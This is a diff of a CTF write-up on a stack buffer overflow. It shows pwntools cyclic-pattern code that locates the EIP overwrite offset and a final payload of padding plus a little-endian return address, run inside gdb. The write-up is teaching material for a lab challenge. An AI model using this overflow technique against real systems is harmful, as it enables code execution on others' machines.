@@ -10,6 +10,7 @@ Additional details will be available after launching your challenge instance.
 
 # Work:
 * To start us off, let's create a pattern
+
 ```
 from pwn import *
 # Generate a cyclic pattern of 200 bytes
@@ -18,8 +19,10 @@ print(pattern)
 >>> print(cyclic(200))
 b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
 ```
+
 <img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/ab68d565-c115-40ee-8ce4-99b3ff61a1e3" />
 * EIP = return address and we can see that's being overrun @ address = 0x62616164
+
 ```
 >>> from pwn import *
 >>> print(cyclic_find(0x62616164))
@@ -39,7 +42,9 @@ python3
 b'\x96\x92\x04\x08'
 >>> print(cyclic(200))
 ```
+
 * Submit this payload:
+
 ```
 pwngdb> r <<< $echo("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x96\x92\x04\x08")
 ```
